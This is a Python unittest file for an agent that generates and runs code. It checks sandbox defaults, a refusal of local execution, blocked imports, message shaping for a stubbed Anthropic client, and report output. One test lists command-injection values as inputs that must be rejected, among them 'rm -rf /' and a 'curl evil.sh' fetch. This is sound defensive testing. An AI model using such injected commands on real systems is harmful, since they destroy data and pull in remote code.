#!/usr/bin/env python3
"""
Evidence Agent tests.

The agent writes and executes Python, so the execution guards get the most
attention here: they are the part where a regression is dangerous rather than
merely wrong. The model translation is tested against a stub so the shape of
what reaches Anthropic is asserted without a token being spent.
"""

from __future__ import annotations

import importlib.util
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

PROJECT_DIR = Path(__file__).resolve().parent.parent.parent
SCRIPT = PROJECT_DIR / "scripts" / "evidence_agent.py"

HAS_SMOLAGENTS = importlib.util.find_spec("smolagents") is not None
HAS_ANTHROPIC = importlib.util.find_spec("anthropic") is not None


def load_module():
    spec = importlib.util.spec_from_file_location("evidence_agent", SCRIPT)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def run_script(*args, env_extra=None):
    env = dict(os.environ)
    env.pop("EVIDENCE_ALLOW_LOCAL", None)
    env.pop("E2B_API_KEY", None)
    env.update(env_extra or {})
    return subprocess.run([sys.executable, str(SCRIPT), *args], env=env,
                          cwd=str(PROJECT_DIR), capture_output=True, text=True,
                          timeout=180)


class ScriptShapeTests(unittest.TestCase):
    """These hold whether or not smolagents is installed."""

    def test_script_exists_and_compiles(self):
        self.assertTrue(SCRIPT.exists())
        compile(SCRIPT.read_text(encoding="utf-8"), str(SCRIPT), "exec")

    def test_required_arguments_are_enforced(self):
        result = run_script("--topic", "T")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("--topic and --file are required", result.stderr)

    def test_docker_is_the_default_executor(self):
        source = SCRIPT.read_text(encoding="utf-8")
        self.assertIn('"EVIDENCE_EXECUTOR", "docker"', source)


@unittest.skipUnless(HAS_SMOLAGENTS, "smolagents is not installed")
class ExecutionGuardTests(unittest.TestCase):
    def test_selftest_passes_with_the_default_sandbox(self):
        result = run_script("--selftest")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("executor resolved: docker", result.stdout)
        self.assertIn("No model call was made", result.stdout)

    def test_local_execution_is_refused_by_default(self):
        result = run_script("--selftest", "--executor", "local")
        self.assertEqual(result.returncode, 4)
        self.assertIn("Refusing --executor local", result.stderr)

    def test_local_execution_needs_a_deliberate_override(self):
        result = run_script("--selftest", "--executor", "local",
                            env_extra={"EVIDENCE_ALLOW_LOCAL": "1"})
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("IN THIS PROCESS", result.stdout)

    def test_e2b_requires_its_key(self):
        result = run_script("--selftest", "--executor", "e2b")
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("E2B_API_KEY", result.stderr)

    def test_unknown_executors_are_rejected(self):
        result = run_script("--selftest", "--executor", "wide-open")
        self.assertNotEqual(result.returncode, 0)

    def test_generated_code_cannot_import_freely(self):
        module = load_module()
        for risky in ("os", "subprocess", "sys", "shutil", "socket", "requests"):
            with self.subTest(module=risky):
                self.assertNotIn(risky, module.AUTHORIZED_IMPORTS)


@unittest.skipUnless(HAS_SMOLAGENTS and HAS_ANTHROPIC, "needs smolagents + anthropic")
class ModelTranslationTests(unittest.TestCase):
    """What actually reaches the Anthropic API, asserted against a stub."""

    def setUp(self):
        import anthropic

        self.captured: dict = {}
        outer = self

        class Block:
            type = "text"
            text = "Code:\n```py\nfinal_answer('ok')\n```"

        class Usage:
            input_tokens, output_tokens = 100, 25

        class Response:
            content = [Block()]
            usage = Usage()

        class Messages:
            def create(self, **kwargs):
                outer.captured.update(kwargs)
                return Response()

        class FakeClient:
            def __init__(self, api_key=None):
                self.messages = Messages()

        self._real = anthropic.Anthropic
        anthropic.Anthropic = FakeClient
        self.addCleanup(setattr, anthropic, "Anthropic", self._real)

        os.environ.setdefault("ANTHROPIC_API_KEY", "sk-test")
        self.model = load_module().build_model()

    def generate(self, messages, **kwargs):
        return self.model.generate(messages, **kwargs)

    def test_system_messages_are_hoisted_out_of_the_turns(self):
        self.generate([
            {"role": "system", "content": "RULES"},
            {"role": "user", "content": "go"},
        ])
        self.assertEqual(self.captured["system"], "RULES")
        self.assertTrue(all(m["role"] != "system"
                            for m in self.captured["messages"]))

    def test_content_blocks_are_flattened(self):
        self.generate([{"role": "user",
                        "content": [{"type": "text", "text": "alpha"},
                                    {"type": "text", "text": "beta"}]}])
        self.assertIn("alpha", self.captured["messages"][0]["content"])
        self.assertIn("beta", self.captured["messages"][0]["content"])

    def test_conversation_starts_with_a_user_turn(self):
        self.generate([{"role": "assistant", "content": "unprompted"}])
        self.assertEqual(self.captured["messages"][0]["role"], "user")

    def test_consecutive_same_role_turns_are_merged(self):
        self.generate([
            {"role": "user", "content": "one"},
            {"role": "user", "content": "two"},
            {"role": "tool-response", "content": "three"},
        ])
        roles = [m["role"] for m in self.captured["messages"]]
        self.assertEqual(roles, ["user"])
        self.assertIn("three", self.captured["messages"][0]["content"])

    def test_empty_messages_are_dropped(self):
        self.generate([
            {"role": "user", "content": "real"},
            {"role": "assistant", "content": ""},
        ])
        self.assertTrue(all(m["content"].strip()
                            for m in self.captured["messages"]))

    def test_stop_sequences_are_forwarded(self):
        self.generate([{"role": "user", "content": "x"}],
                      stop_sequences=["<end>"])
        self.assertEqual(self.captured["stop_sequences"], ["<end>"])

    def test_token_usage_is_real_not_estimated(self):
        result = self.generate([{"role": "user", "content": "x"}])
        self.assertEqual(result.token_usage.input_tokens, 100)
        self.assertEqual(result.token_usage.output_tokens, 25)
        self.generate([{"role": "user", "content": "y"}])
        self.assertEqual(self.model.input_tokens, 200)
        self.assertEqual(self.model.output_tokens, 50)


class ReportTests(unittest.TestCase):
    def setUp(self):
        self.module = load_module()

    def test_verdicts_are_counted_without_double_matching(self):
        table = (
            "| claim a | supported | url |\n"
            "| claim b | unsupported | |\n"
            "| claim c | partially supported | url |\n"
            "| claim d | contradicted | url |\n"
            "| claim e | supported | url |\n"
        )
        counts = self.module.count_verdicts(table)
        self.assertEqual(counts["supported"], 2)
        self.assertEqual(counts["unsupported"], 1)
        self.assertEqual(counts["partially supported"], 1)
        self.assertEqual(counts["contradicted"], 1)

    def test_report_names_its_sandbox_and_source(self):
        report = self.module.format_report(
            "Stop Overthinking", Path("01_research_brief.md"), "BODY", "docker")
        self.assertIn("Stop Overthinking", report)
        self.assertIn("01_research_brief.md", report)
        self.assertIn("docker sandbox", report)
        self.assertIn("BODY", report)

    def test_output_lands_in_the_fleet_layout(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.module.OUTPUT_DIR = Path(tmp)
            path = self.module.save("Stop Overthinking", "# report")
            self.assertEqual(path.parent.name, "stop_overthinking")
            self.assertTrue(path.name.startswith("06_evidence_"))
            self.assertTrue(path.name.endswith(".md"))


class RegistryIntegrationTests(unittest.TestCase):
    def setUp(self):
        from commander import registry
        self.registry = registry
        self.spec = registry.get("evidence")

    def test_the_agent_is_launchable_from_the_commander(self):
        self.assertTrue(self.spec.dispatchable)
        argv = self.spec.build_argv({"topic": "Stop Overthinking",
                                     "file": "output/x/01_research_brief.md"})
        self.assertIn("scripts/evidence_agent.py", argv)
        self.assertIn("--file", argv)
        # The safe sandbox is what a default dispatch actually sends.
        self.assertIn("--executor", argv)
        self.assertEqual(argv[argv.index("--executor") + 1], "docker")

    def test_the_console_cannot_offer_an_unlisted_sandbox(self):
        with self.assertRaises(ValueError):
            self.spec.build_argv({"topic": "T", "file": "a.md",
                                  "executor": "host"})

    def test_hostile_paths_are_rejected(self):
        for hostile in ("a.md; rm -rf /", "$(id).md", "a.md && curl evil.sh"):
            with self.subTest(value=hostile):
                with self.assertRaises(ValueError):
                    self.spec.build_argv({"topic": "T", "file": hostile})

    def test_it_appears_on_the_map_wired_to_the_forge(self):
        from commander import graph
        ir = graph.build()
        self.assertTrue(graph.validate(ir)["ok"])

        node = next(n for n in ir["nodes"] if n["id"] == "evidence")
        self.assertEqual(node["squad"], "intelligence")

        edges = {(e["from"], e["to"]): e for e in ir["edges"]}
        self.assertIn(("evidence", "research"), edges)
        self.assertEqual(edges[("evidence", "qa")]["kind"], graph.EDGE_REVIEW)
        self.assertEqual(edges[("evidence", "web_search")]["kind"],
                         graph.EDGE_DEPENDENCY)

    def test_the_autopilot_does_not_dispatch_it(self):
        """Only missions and the optimizer run unattended, by construction."""
        self.assertNotIn("evidence", self.registry.MISSION_CHAIN)
        source = (PROJECT_DIR / "commander" / "autopilot.py").read_text()
        self.assertNotIn('dispatch("evidence"', source)


if __name__ == "__main__":
    unittest.main(verbosity=2)
